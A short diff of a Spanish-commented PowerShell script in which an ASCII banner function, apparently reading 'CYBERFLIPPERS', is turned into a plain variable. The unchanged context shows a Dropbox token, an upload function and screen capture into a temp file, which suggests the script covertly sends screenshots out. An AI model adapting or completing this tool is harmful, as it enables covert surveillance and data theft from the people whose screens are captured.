@@ -1,9 +1,8 @@
 # Define el token de acceso de Dropbox
 $db = ""
 
-# Función para mostrar el encabezado artístico
-function Show-Header {
-    $header = @"
+# Encabezado artístico
+$header = @"
 ########################################################################################################################
 #    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           # 
 #   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
@@ -13,8 +12,6 @@ function Show-Header {
 #   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
  #########################################################################################################################           
 "@
-    return $header
-}
 
 # Función para subir archivos a Dropbox
 function DropBox-Upload {
@@ -57,7 +54,6 @@ try {
     $screenshotPath = Capture-Screen
 
     # Leer contenido de la captura de pantalla
-    $header = Show-Header
     $fileContent = Get-Content -Path $screenshotPath -Raw
     $combinedContent = $header + "`r`n" + $fileContent
     $tempFilePath = "$env:temp\sc_with_header.png"
